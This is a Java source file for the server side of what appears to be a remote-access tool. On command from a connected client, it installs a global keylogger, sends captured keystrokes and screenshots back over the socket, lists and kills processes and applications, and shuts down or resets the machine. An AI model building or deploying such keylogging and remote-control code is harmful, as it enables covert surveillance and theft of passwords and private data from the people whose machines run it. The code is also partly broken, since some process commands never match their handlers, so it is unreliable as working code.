package model;

import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.GlobalScreen;

import controller.Controller;

import javax.imageio.ImageIO;

public class Server {
    public enum Status {
        STOP,
        RUNNING,
    }
    private ServerSocket serverSock;
    private Socket clientSock;
    private InputStream inputStream;
    private OutputStream outputStream;
    private KeyLogger keyLogger;
    private Controller controller;
    private Status status;
    private String IP;
    private boolean isHooked;
    private ScreenShot screenShot;

    public Server() throws UnknownHostException {
        this.IP = InetAddress.getLocalHost().getHostAddress();
        this.controller = controller;
        keyLogger = new KeyLogger();
        screenShot = new ScreenShot();
        status = Status.STOP;
        isHooked = false;

        // Register NativeHook for KeyLogger

        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

    }

    public void run() {
        status = Status.RUNNING;
        new Thread(() -> {
            acceptClient();
            notifyController("Connected");

            while(status == Status.RUNNING) {
                byte[] buffer = new byte[128];
                try {
                    inputStream.read(buffer);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                String action = new String(buffer).trim();

                switch (action) {
                    case ("Hook"):
                    case ("Unhook"):
                    case ("Print"): {
                        handleKeyLogging(action);
                        break;
                    }
                    case ("Screen Shot"):
                    {
                        handleScreenShot(action);
                        break;
                    }

                    case ("List Process"):
                    case ("Stop Process"):
                    case ("Start Process"):
                    {
                        handleProcess(action);
                        break;
                    }

                    case ("List App Installed"):
                    {
                        notifyController(action);
                        applicationModel.listAppInstalled();
                        break;
                    }
                    case ("Start App Installed"):
                    {
                        notifyController(action);
                        applicationModel.startApp();
                        break;
                    }

                    case ("List App Running"):
                    {
                        notifyController(action);
                        applicationModel.listAppRunning();
                        break;
                    }
                    case ("Stop App Running"):
                    {
                        notifyController(action);
                        applicationModel.stopAppRunning();
                        break;
                    }

                    case ("Exit"):
                    {
                        status = Status.STOP;
                        break;
                    }

                    case ("Shutdown"):
                    {
                        shutdownModel.handleShutdown();
                        break;
                    }

                    case ("Reset"):
                    {
                        shutdownModel.handleReset();
                        break;
                    }

                    case ("Close Connection"):
                    {
                        notifyController(action);
                        controller.stop();
                    }
                }
            }

            cleanup();
        }).start();

    }

    public String getIP() {
        return IP;
    }

    public void addController(Controller controller) {
        this.controller = controller;
    }

    private void handleProcess(String action)
    {
        notifyController(action);

        switch (action)
        {
            case ("ListProcess"):
            {
                processModel.listProcess();
                break;
            }
            case ("StopProcess"):
            {
                processModel.stopProcess();
                break;
            }
        }
        String line;
    }

    public void setStatus(Status status) {
        this.status = status;
    }

    private void handleScreenShot(String action)
    {
        notifyController(action);
        String e = screenShot.takeScreenShot();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedImage image = screenShot.getImage();
        try
        {
            ImageIO.write(image, "jpg", byteArrayOutputStream);
            outputStream.write(byteArrayOutputStream.toByteArray());
            outputStream.flush();
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }
    }

    private void handleKeyLogging(String action) {
        notifyController(action);
        switch(action) {
            case ("Hook"): {
                if (!isHooked) {
                    GlobalScreen.addNativeKeyListener(keyLogger);
                    isHooked = true;
                }
                break;
            }
            case ("Unhook"): {
                if (isHooked) {
                    GlobalScreen.removeNativeKeyListener(keyLogger);
                    keyLogger.clearLogs();
                    isHooked = false;
                }
                break;
            }
            case ("Print"): {
                StringBuilder out = new StringBuilder();
                for (int i = 0; i < keyLogger.logs.size(); i++) {
                    out.append(keyLogger.logs.get(i));
                }
                byte[] tmp = out.toString().getBytes();

                try {
                    outputStream.write(tmp);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }
        }
    }

    public ServerSocket getServerSock() {
        return serverSock;
    }

    public Socket getClientSock() {
        return clientSock;
    }

    public OutputStream getOutputStream() {
        return outputStream;
    }

    public InputStream getInputStream() {
        return inputStream;
    }

    private void notifyController(String action) {
        controller.handleAction(action);
    }

    private void acceptClient() {
        try {
            clientSock = serverSock.accept();
            inputStream = clientSock.getInputStream();
            outputStream = clientSock.getOutputStream();

            processModel = new ProcessModel(inputStream, outputStream);
            applicationModel = new ApplicationModel(inputStream, outputStream);
            shutdownModel = new ShutdownModel();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void createServerSocket(int port, int backlog) {
        try {
            serverSock = new ServerSocket(port, backlog);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void cleanup() {
        try {
            GlobalScreen.unregisterNativeHook();
            serverSock.close();
            clientSock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private ProcessModel processModel;
    private ApplicationModel applicationModel;
    private ShutdownModel shutdownModel;
}
